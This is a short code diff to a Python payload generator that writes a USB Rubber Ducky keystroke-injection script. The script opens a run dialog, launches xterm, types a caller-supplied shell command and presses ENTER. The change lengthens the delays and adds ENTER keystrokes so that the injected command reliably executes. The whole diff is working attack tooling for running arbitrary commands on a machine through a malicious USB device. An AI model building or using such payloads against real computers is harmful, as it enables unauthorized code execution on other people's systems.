@@ -28,13 +28,17 @@ class payload:
 			os.mkdir("payloads/rubber_duck")
 		payload_save_path = "payloads/rubber_duck/payload.txt"
 		payload = """\
-DELAY 10
+DELAY 500
 ALT F2
-DELAY 10
+DELAY 500
 STRING xterm
-DELAY 10
+DELAY 500
+ENTER
+DELAY 500
 STRING """+shell_command+"""
-DELAY 100
+DELAY 500
+ENTER
+DELAY 500
 """
 		f = open(payload_save_path,"w")
 		f.write(payload)
